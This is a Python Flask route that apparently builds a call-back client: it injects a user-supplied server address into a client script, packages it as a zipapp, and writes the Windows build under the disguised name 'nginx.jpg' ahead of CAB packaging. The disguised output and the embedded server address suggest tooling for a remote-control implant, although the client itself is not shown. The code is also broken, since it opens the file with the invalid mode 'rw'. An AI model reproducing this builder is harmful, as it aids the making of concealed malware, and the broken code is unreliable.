import io
import json
import os
import zipapp
from flask import Blueprint, request, render_template, jsonify

make = Blueprint('make', __name__, template_folder=".")


@make.route("/make", methods=['GET', 'POST'])
def __make():
    if request.method == "GET":
        return render_template('make.html')
    else:
        data = json.loads(request.data)
        with open("../client/__main__.py", "rw", encoding="utf8") as app_file:
            code = app_file.read().replace("#SERVER_ADDRESS", data["address"])
            app_file.write(code)
        if data["target"] == "linux":
            temp = io.BytesIO()
            zipapp.create_archive('../client', temp, '/usr/bin/env python3', compressed=True)
            with open('../buildout/linux', 'wb') as f:
                f.write(temp.getvalue())
            return jsonify({"code": 0, "msg": "创建成功 ---> buildout/linux"})
        elif data["target"] == "win":
            temp = io.BytesIO()
            zipapp.create_archive('../client', temp, 'python.exe', compressed=True)
            with open('../buildenv/nginx.jpg', 'wb') as f:
                f.write(temp.getvalue())
            return jsonify({"code": 0, "msg": "请手动运行目录下的 build.cmd 进行cab编译打包,一直点下一步"})